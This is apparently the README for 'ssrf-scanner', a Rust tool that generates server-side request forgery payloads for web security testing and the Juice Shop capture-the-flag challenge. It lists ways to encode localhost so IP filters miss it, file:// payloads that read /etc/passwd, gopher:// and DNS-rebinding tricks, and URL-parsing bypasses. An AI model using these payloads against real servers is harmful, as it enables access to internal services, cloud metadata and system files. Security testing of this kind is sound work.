# ssrf-scanner

SSRF payload generator for web security testing.

## Installation

```bash
cargo build --release
# Binary: target/release/ssrf-scanner
```

## Usage

### Localhost Bypass Variants

Generate various representations of localhost to bypass filters:

```bash
ssrf-scanner localhost 3000
```

Output:
```
=== Localhost Bypass Variants (port 3000) ===

127.0.0.1            → http://127.0.0.1:3000
localhost            → http://localhost:3000
decimal              → http://2130706433:3000
hex                  → http://0x7f000001:3000
octal                → http://0177.0.0.1:3000
ipv6                 → http://[::1]:3000
...
```

### Internal Network Variants

Generate internal network address patterns:

```bash
ssrf-scanner internal 80
```

Generates addresses for:
- 10.0.0.0/8 (Private Class A)
- 172.16.0.0/12 (Private Class B)
- 192.168.0.0/16 (Private Class C)
- 169.254.0.0/16 (Link-local)

### File Protocol Variants

Generate file:// protocol payloads:

```bash
ssrf-scanner file
```

Output:
```
=== File Protocol Variants ===

etc/passwd           → file:///etc/passwd
windows hosts        → file:///C:/Windows/System32/drivers/etc/hosts
...
```

### IP Conversion

Convert IP address to various formats:

```bash
ssrf-scanner ip-convert 127.0.0.1
```

Output:
```
=== IP Conversions for 127.0.0.1 ===

Decimal:  2130706433
Hex:      0x7f000001
Octal:    0177.0.0.1
```

### Juice Shop Challenge

Get payloads for the Juice Shop SSRF challenge:

```bash
ssrf-scanner juice-shop
```

## Bypass Techniques

### IP Address Obfuscation
- **Decimal**: `2130706433` = `127.0.0.1`
- **Hex**: `0x7f000001` = `127.0.0.1`
- **Octal**: `0177.0.0.1` = `127.0.0.1`
- **Mixed**: `0x7f.0.0.1` = `127.0.0.1`

### DNS Rebinding
- `localtest.me` -> `127.0.0.1`
- `127.0.0.1.nip.io` -> `127.0.0.1`
- `spoofed.burpcollaborator.net`

### Protocol Confusion
- `http://` -> `https://`
- `http://` -> `file://`
- `http://` -> `gopher://`

### URL Parsing Tricks
- `http://evil@internal/` (credential injection)
- `http://internal#@evil/` (fragment bypass)
- `http://internal%00@evil/` (null byte)

## Use Cases

### CTF Challenges
- Juice Shop SSRF challenge
- Internal service discovery
- Cloud metadata access

### Security Testing
- Test SSRF protections
- Bypass IP blocklists
- Access internal services
